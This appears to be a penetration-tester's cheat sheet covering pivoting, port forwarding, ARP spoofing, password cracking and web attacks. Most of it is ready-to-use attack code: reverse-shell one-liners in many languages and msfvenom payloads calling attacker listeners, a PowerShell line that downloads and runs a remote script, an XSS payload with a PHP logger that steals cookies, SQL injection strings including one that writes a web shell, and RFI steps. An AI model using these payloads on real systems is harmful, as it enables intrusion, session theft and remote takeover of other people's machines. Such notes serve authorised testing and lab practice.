 

# GENERAL

### Host a webserver or ftp publicly
 
 We will use ngrok to port forward our local server to public

first start a python server and then simple use ngrok in same directort

./ngrok http portnumber



then youll get a url and thats our public facing server

If we want to open a public facing port to get a reverse shell connection back from real internet facing target

./ngrok tcp portnumber

Now use the url provided by ngrock as target destination in payloads


for example we get ngrok url like tcp://6.tcp.ngrok.io:11887

In payloads we will omit the tcp:// and seperate the port with host so payload will be like this


nc.exe 6.tcp.ngrok.io 11887 -e cmd.exe
 


### Web Server Service

python3 -m http.server portnumber

python -mSImpleHTTPServer portnumber

php -S IP:PORT


### FTP Server service

python3 -m pyftpdlib -p21


### SMB server service

python3 /opt/impacket-0.9.19/impacket/smbserver.py sharename .



### Downloading a file

- wget "url:port"

- curl "url:port"

 
> Run this on our local machine	
   
- scp  hostname@IP: <filepath>

- nc -l -p port > filename     receiver machine
- nc -w 3 IP port < file     sender machine


### Generate ssh keys

- ssh-keygen 

### Password for passwd file

> This command will make a password compatible for /etc/passwd and we can then put the output instead of x in /etc/passwd

- openssl passwd <passwordtocreate>  


### Http-authentication

if a web directory  directly prompts for a login using get rrequest with the popupp window then if we have to use that link anywhere we can authenticat it using

> http://admin:pass@example.com/	

### Finding Specific Strings in specified directoy

- grep -rnw / -e 'StringtoSearch'  2>/dev/null           / is root directory.Can be any directory


### Reverse a wordlist

- We can reverse a wordlist simply by piping it into tac command

> cat list1.txt | tac > reverse.txt


### tcpdump



    tcpdump -D (available interfaces)
    ### filter by port
 
    tcpdump --interface interfacename -nn port portno -v
 
     ### filter by destination

     tcpdump --interface interfacename -nn des ip -v

     ### filter by source

     tcpdump --interface interfacename -nn src ip -v

### Cap file hash crack (Wifi capture hash crack)

> aircrack-ng file.cap -w ~/Wordlists/rockyou.txt

### Check if rootlogin is allowed

- grep PermitRootLOgin /etc/ssh/sshd_config

### tr(translate)

-  tr ' '  ','   **This Command will replace space in given text or file with commas**

-  tr -d '[a-z]'   **this command will delete all the alphabets from the file or text**


### awk

-   awk '/pattern to search in a file/' file.txt

-  awk '{print $1 $4}' file.txt        **this will output first and fourth word in each line of a string** 

-  
### Change exploit dos format to unix format

    sometimes our exploit code uses dos format in code to support older systems.This causes problems in linux systems so we change this with help of dos2unix utility available on kali.
    
  > dos2unix exploitfile
  
  we can also do this with sed command
  
  > sed -i 's/\r//' exploitfile 

 

### Github

> First clone a repository empty or commited

1. git clone "URL"

2. git add --all                   update eveything to be added in repo

3. git commit -m"commit message"      commit the update

4. git push                          push the commit to repo

### Unshadow(combine shadow file hashes to passwd file)

 -   unshadow etcpasswdfile etcshadowfile > outputfile



# ########

# Port Forwarding

  ### ssh
  - suppose if a mysql server is running on a victim machine internelly and we cant access it
  
  - We can fowrward that port process through ssh to our machine and then access it
   
   - This command will be ran on victim machine 
     
     localport is the port to which we will access that service externaly service port is what is being used by 
     service in the victim machine   
     
     If we are in ssh and see a internal service running on certain port then we can do local port forwarding
     
     #### Local Port Forwarding
      
  > ssh -L(OURlocalport):internal server ip:(internalport) remoteuser@machineip   


      #### Remote Port Forwarding
      This  is used when target dont have ssh running and we cant port forward directly
      
      Remote port forwarding means we  will forward our desirable port to our ip from the compromised shell.
      
      If we our stuck with this  option and need to do remote forwarding , first we need to star ssh service (sudo systemctl start ssh) on machine and setup its password,and usernames. BUt its better to create new ssh keys and using those and removing them after its purpose has been fulfilled.
     - Now copy the id_rsa.pub contents and add following in /homedir/.ssh/uthorizedkeys
     
    ` command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
     YOUR ID_RSA.PUB ` 
      
      This will allow us to to only utilize ssh service for port forwarding so we will be safe ou there in Public Internet
      
  >			
  
  we can do following to create proxying tunnel just like forward tunneling
  
  This will create a proxy through port 1337 and now we can use tools from ou system on target using proxychains command.
  
  NOte: Following command will be run on gained shell and when either we dont have ssh access or ssh is not open on target
  
  > ssh -R 1337 USERNAME@ourIP -i KEYFILE -fN
  
   
  
  > Now  go to our machine and run the service to which we had to port forward
   
   - **Now access the service externaly**
  
  > <servicename> 127.0.0.1(we will access the service on this url)  <localport>(the port which we specified in victim machine when port forwarding)

## ssh tunneling Or Proxying(Internal Port scanning)
 
   > ssh -D 127.0.0.1:9050 -N username@ip
   
   > NOw just proxychains rustscan -a 127.0.0.1

       Here 9050 is the port thorugh which traffic will move.We can set it in proxychains.conf
       or in foxy proxy in webapps case

## Chisel port forward

### Remote port forward

We can use these all for proxying and routing traffic through networks. JUst need to adjust these commands and targets according to the networks infrastrucrure
Sometimes when we want to port forward a port of internal network which can be accessed from another internal network then we can replac the localhost ip with the internal server ip.Its not always neccassary that we use 127.0.0.1 because it then only gives us access to port of already compromised sserver,

If ssh is not available and we want to port forward we can use chisel

1. Transfer chisel binary to target

2. run following in our machine or reciever machine	

> chisel server -p 8000 --reverse

3. Now run following in victim machine

> ./chisel client 10.4.30.255:8000 R:7777:127.0.0.1:9001

./chisel client (our Ip addresss):Listening-Port R:(port on which to be forward):TARGETIPorLOCALHOST:(Remoteportonwhichserviceisrunning)

4. NOw visit 127.0.0.1:7777 to access internal server

### Local port forward

As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.

On the compromised target we set up a chisel server:

> ./chisel server -p LISTEN_PORT

We now connect to this from our attacking machine like so:

>./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT

## Chisel proxying

### reverse proxying

the following process will tunnel the connection through port 1080 on our machine which is default port of chisel. We can set chisel socks5 port no in proxychains.conf. Then we can use proxychains with any command and that traffic will be tunneled through specified port.


1- On our local machine start a chisel listener

 > ./chisel server -p LISTEN_PORT --reverse &
 
        Or
        
        
  >  ./chisel server -p LISTEN_PORT --socks5          (If proxyi9ng throu another network) 
 
2- on compromised machine

> ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &

3- Now 127.0.0.1:1080 is connected to compromised machine.


## Socat relay

suppose we compomise apublic facing server and now also have ability to execute commands(proxying or port forwarding) on another internal machine. The problem is that the internal machine cannot directly connect back to public internet. So we try to use the first compromised server as a relay to get things done

  1. start a nc listener on our machine
  
  > nc -nvlp 53
  
  2. Now setup a relay in public compromised server . This will act as a medium of communication
  
  > ./socat tcp-l:8000 tcp:OURip:53 &
  
  Here 8000 port is the relay .any traffic thorugh this port will be directed towards us. Usually we have to open up a port on public compomised server so we can use that as a relay medium(In this case we opened port 8000)
  
  3. NOw we have to execute commands on thetarget internal network with port set to the relay port.THis way all traffic is passed to us
  
  4. We can execute a reverse shell on first machine with target ip set to internal ip and port
  
  # Suppose public compomised server is 10.10.10.100.Internal server is 10.10.10.150
  
  following conmmandd will give us reverse shell
  
  > nc 10.10.10.150:8000 -e /bin/bash
  
  5. If we have found another method to execute commands on internal server directly from our machine,we can try to get reverse shell by giving the ip address of compromised public server with relayed port 


# NETWORKING


### local network Info

- ifconfig

- ip a


### All IP's in a subnet

- arp-scan -l

### Route (specifying gateways to IP's)


- route                                                 displays routing table

- ip route add <IP to add> via <gateway>                gateway is usually router address(NAT)


#### Via metasploit

first we can see the internal ip to which pivot to by ipconfig or using some other enumeration tools

if we have meterpreter session run

> run autoroute -S ROUTEIP

Now a route is added to our target system and is like as we have opened a proxy tunnel using chisel or tools etc

Now we can portscan ,port forward etc


### OpenVpn

- openvpn <vpnfilepath>                    for labs and ctfs :()

### ARP SPoofing

  **install dsniff(a network utility)arpspoof is part of this utilty**

   ### arpspoof(Man in the middle attack between two servers in your network)
 
1.   **First we have to enable IP forwarding on our machine to be able to intercept and pass on the packets**

>   **echo 1 > /proc/sys/net/ipv4/ip_forward**

2.  Now run Following command to start mitm attack 

arpspoof -i interface(eth0 or tap0 etc) -t "targetclient IP" -r "TargetServerSide IP"

3. you will be able to capture all the data on wireshark


### Netstat OR Secure Sockets(See internal open ports)

- netstat -tunp       **list active connections**

- netstat -a

-  ss -tulwn

# ########

### Open a port on linux

> firewall-cmd --zone=public --add-port PORT/tcp





# TOOLS

- **pspy (hidden cronjobs and services)**

- **steghide (extract files from an image)**

   - steghide extract -sf <jpg>

- **stegcracker (cracking images passphrase when extracting data)**

   - stegcracker <jpg> <wordlist>

- **johntheripper (cracking passwords)**

   -  john <HashFile> --wordlists=wordlist

- **ssh2john (converting ssh keys into hash for cracking in john)**

   1.  python3 ssh2john <ssh_keys> > <hashoutput>
   2.  john <hashoutput> ---wordlist=wordlist

- **zip2john (cracking zip passwords)**

   1.  zip2john <zipfile> > <hashoutput>
   2.  john <hashoutput>  --wordlist=wordlist 

- **rar2john (cracking rar passwords)**

   1.  rar2john <rarfile> > <hashoutput>
   2.  john <hashoutput>  --wordlist=wordlist 

- **gpg2john and gpg (cracking pgp files passwords and accessing pgp files)**

   1.  gpg2john key.asc > hash
   2.   john hash --wordlist=wordlist 
   3.   gpg --import key.asc
   4.   gpg --decrypt file.pgp


- **Password Variation maker**

> hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule

- **Hydra (bruteforcing credentials from different services)**

     #### Basic Usage   
  
 >   hydra -l <username> -P <wordlist> service://IP -S portnumber   

     #### Bruteforce login pages
     
 ##### Get forms (Basic Auth)
 
 hydra -l username -p wordlist ip -m /directorypath http-get -s portno
 
 ##### Post forms
 
>    hydra -l username -Pwordlist ip http-post-form  "/login.php:usernameparameter=username&passwordparameter=^PASS^:ANy error to indicate hydra that we are successful"

- Make sure dont leave any space after colons or it will error out

 S for success and F for fail in above command

     **NOTE!!!! the parameters name must be that which application is using.We can use burp to see those post parameters**  
    
     **In above command if we are also bruteforcing username then we will pass ^USER^ in username parameter**
     
     
 - Sometimes webserver requires basic authentication to access a resource . (THat simple popup windows which asks for credentials)
 
 if we are bruteforcing a certain directory and we require to bypass the previous basic authentication then we can pass the credentials in http request itself
 


> http://admin:pass@example.com/    


- **gobuster (Hidden directories and file on webserver)**

   -  gobuster dir -u <url> -w <wordlist>  (Directories)

   -  gobuster vhost -u <url> -w <wordlist>  (subdomains/Dns)

- **binwalk  (check hidden data in files)**

   binwalk <filename>

> extracting hidden data

   binwalk -e <filename>

- **Strings (string representation of file hexdump)**

   Strings <filename>




# #######

# Databases

  - ## MySQL
      
       To connect to mysql server over a network
 
>       mysql -u <username>  -p  -h host or ip  
       
         NOw enter password

        **View databases**

>     We can tell mysql to use a specific databse from a file(If we saw a sql file on machine) 

    **source DatabseFileName**


>      SHOW DATABSES;    


        **Use a database**

>       USE DATABASE <NAME>;

        **view Tables**

>       SHOW TABLES;

         **View coloumns and rows**

>        DESC <TABLE_NAME>;

         **View data stored**

>       SELECT * FROM <TABLE_NAME> 

         **Filter dumped data using wildcars**  
 
>  Iin MYSQL wildcards are specifeid by % instead of *. If we want to specify a format and want to dump data
>  only of that format then we can use command similiar to this

      ***SELECT * FROM Tablename WHERE coloumn_name LIKE "%{%}%"***


         **delete data**

>       DELETE FROM <TABLE_NAME> WHERE COLOUMN_NAME=DATA_STORED





# ######

# SHELLS

### TTY Stable shells

- bash -i

- /bin/bash -i

- /usr/bin/script -qc /bin/bash 1&>/dev/null

- python3 -c 'import pty;pty.spawn("/bin/bash")'

- python -c 'import pty;pty.spawn("/bin/bash")'


### Bash

#### Bash TCP

- bash -i >& /dev/tcp/10.4.30.255/6969 0>&1

- 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196



#### Bash UDP

- Victim:
        sh -i >& /dev/udp/10.0.0.1/4242 0>&1

- Listener:
        nc -u -lvp 4242

> Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash

### Python


#### Linux only

- IPv4

         export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

- IPv4

        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

- IPv6

        python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'

        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

- Windows only

        C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"

### PhP

- php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'

- php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

- php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'

- php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'

- php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'

- php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'

- php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

### Perl

- perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

- perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'


#### NOTE: Windows only
- perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

### Ruby

- ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

- ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

#### NOTE: Windows only
- ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'





### Golang

- echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go


### Netcat Traditional

- nc -e /bin/sh 10.0.0.1 4242
- nc -e /bin/bash 10.0.0.1 4242
- nc -c bash 10.0.0.1 4242

### Netcat OpenBsd os

- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f






### OpenSSL

#### Attacker:

1. user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
2. user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
or
1. user@attack$ ncat --ssl -vv -l -p 4242

2. user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s

TLS-PSK (does not rely on PKI or self-signed certificates)

#### generate 384-bit PSK
#### use the generated string as a value for the two PSK variables from below
openssl rand -hex 48 
#### server (attacker)
export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
#### client (victim)
export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE






### Powershell

- powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

- powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

- powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')


### Awk

- awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null


### Java

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

#### Java Alternative 1

String host="127.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

Java Alternative 2

NOTE: This is more stealthy

Thread thread = new Thread(){
    public void run(){
        // Reverse shell here
    }
}
thread.start();




### War

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file





### Lua

Linux only

lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"

Windows and Linux

lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'






### NodeJS

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py




### Groovy

by frohoff NOTE: Java reverse shell also work for Groovy

String host="10.0.0.1";
int port=4242;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

Groovy Alternative 1

NOTE: This is more stealthy

Thread.start {
    // Reverse shell here
}




### C

> Compile with gcc /tmp/shell.c --output csh && csh

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 4242;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}





### Meterpreter Shell



- Web shells tcp
      
       msfvenom -p php/meterpreter/reverse_tcp LHOST=10.4.30.255 LPORT=6969 -f raw > shell.txt
     
          we use the txt extension because sometimes server  executes the php on our machien

- Windows Staged reverse TCP

        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe



- Windows Stageless reverse TCP

        msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe



- Linux Staged reverse TCP

        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf



- Linux Stageless reverse TCP

        msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf




### Other platforms

$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f exe > shell.exe
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war
$ msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
$ msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
$ msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php



# #######


# WebApp Attacks

-  ## XSS
    
    ### Stealing cookies      
  
       **Insert this payload in vulnerable app**     

   >   <script>var i=new image();i.src="http://oursite.com/receiverfiletowritecookies.php?parameter="+escape(document.cookie)</script> 
 
        **receiving php file on which cookies will be written**
 
   >     <?php
   >      
   >    $ip=$_SERVER['REMOTE_ADDR'];$browser=$_SERVER['HTTP_USER_AGENT'];
   >    
   >   
   >    $fp=fopen('txtstorefileonourserver.txt','a');
   >    
   >   fwrite($fp,$ip.''.$browser." \n");fwrite($fp,urldecode($_SERVER['QUERY_STRING']. " \n\n"));fclose($ip);?>

- ## SQLI
 
   -   **injecting a single quote can cause weird behavior of app indicating possible injection point**
   -   **Try all get(through url),post(burp) parameters and inject in headers also(burp)**
   -   **when testing boolean sqli,a true condition shows as normal while false causes app to malfunction**
   -   ****
      
     ### basic boolean sqli

       web app uses select example,example2 from table_name where id=somevalue . We add our payload to make it a boolean condition

       This query dump all the information which is queried and we only check comdition with the parameter to make statement true

>     ' or 1=1--        

     
     ### basic union sqli

       Union based sqli doesnt ignore the app sql query as there is no boolean condition so application query is executed alongside our crafted query

      Union joins different sql queries together

      **We dont know that how many attributes is the application asking in the query which we manipulate**
      
      **to tackle that we can use following payload**
      ***'union select null,null;***   we can keep increasing amount of nulls in our query and at which number web app dont give any error,thats the right amount of queries
      **We can also do this by using ORDER By 1,order by 2(keep increasing orders until you get right amount of queiries)**

>     ' union select username,password from table_name where 1=1;

     #### local database username

>      we can see the database user using user() function ; 
>      Query is   ' union select user();-- -   

   -   admin' or '1'='1 	     *Basic Auth Bypass*
   
   -   admin')-- - 	     *Basic Auth Bypass With comments*

   -   ' order by 1-- - 	*Detect number of columns using order by*

   -   cn' UNION select 1,2,3-- - 	*Detect number of columns using Union injection*

   -   cn' UNION select 1,@@version,3,4-- - 	*Basic Union injection*

   -   UNION select username, 2, 3, 4 from passwords-- - 	*Union injection for 4 columns*

   -  SELECT @@version 	    *Fingerprint MySQL with query output*

   -  SELECT SLEEP(5)  	         *Fingerprint MySQL with no output*

   -  cn' UNION select 1,database(),2,3-- - 	     *Current database name*

   -  cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - 	*List all databases*

   -  cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - 	*List all tables in a specific database*

   - cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - 	*List all columns in a specific table*

   - cn' UNION select 1, username, password, 4 from dev.credentials-- - 	*Dump data from a table in another database*

   -  cn' UNION SELECT 1, user(), 3, 4-- - 	*Find current user*

   -  cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- - 	*Find if user has admin privileges*

   -  cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- - 	*Find if all user privileges*

   - cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- - 	*Find which directories can be accessed through MySQL*
 
   -  cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- - 	*Read local file*

   - select 'file written successfully!' into outfile '/var/www/html/proof.txt' 	*Write a string to a local file*

   - cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- - 	*Write a web shell into the base web directory*



- ## LFI
 
https://gupta-bless.medium.com/exploiting-local-file-inclusion-lfi-using-php-wrapper-89904478b225



- when normal lfi doesnt return output,then we can use this and we will get our output in base64.

> http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index


### RFI

1. Use the following shell in rfi and host a server in the directory

we use .txt format because sometimes server executes php on our machine isntead of victim

> msfvenom -p php/meterpreter/reverse_tcp LHOST=10.4.30.255 LPORT=6969 -f raw > shell.txt

2. Now go to the url and include your webserver and file alongside it

> http://site.com?example.php=http://10.4.30.255:80/shell.txt

3. Listen on msf handler with the php/meterpreter/reverse_tcp set



## XXE

